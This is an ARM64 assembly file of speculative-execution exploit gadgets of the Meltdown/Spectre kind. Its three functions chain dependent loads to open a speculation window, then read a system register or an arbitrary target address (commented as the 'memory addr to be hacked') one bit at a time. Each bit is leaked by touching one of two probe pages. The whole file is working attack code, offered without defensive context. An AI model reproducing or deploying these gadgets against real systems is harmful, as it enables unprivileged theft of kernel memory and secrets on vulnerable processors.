/*
	spec_read(x0, x1, x2)
	x0 is the probe addr
	x1 deference chain
	x2 is a bit to be deciphered
*/

.global spec_read
.global mem_read

.func
spec_read:
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x1, [x1] /* bang, SIGSEGV generated*/

	/* gets replaced in the c file with the mrs x3, spec_reg
	   This is 1st speculation
	 */

	nop

	/* shift bit position 0 */
	lsr x3, x3, x2

	/* zero'ise all the other bits */
	and x3, x3, #1

	/* left shift bit by a page size (4K)
	   For 0 bit has no effect, x0 points to page#1
	   For 1 bit we add 4K so x0 points to page#2
	 */
	add x0, x0, x3, lsl #12

	/* And finally load it.
	   this is 2nd speculation
         */
	ldr x0, [x0]
	ret
.endfunc

/*
	mem_read(x0, x1, x2, x3)
	x0 is the probe addr
	x1 dereference chain
	x2 is a bit to be deciphered
	x3 memory addr to be hacked
*/

.func
mem_read:
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x4, [x3]
	lsr x4, x4, x2
	and x4, x4, #1
	add x0, x0, x4, lsl #12
	ldr x0, [x0]
	ret
.endfunc

.global mem_read_by_article
.func
mem_read_by_article:
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x1, [x1]
	ldr x1, [x1]
	cbz x1, over /*this will be taken*/
	ldr x4, [x3]
	lsr x4, x4, x2
	and x4, x4, #1
	add x0, x0, x4, lsl #12
	ldr x0, [x0]
over:
	ret
.endfunc
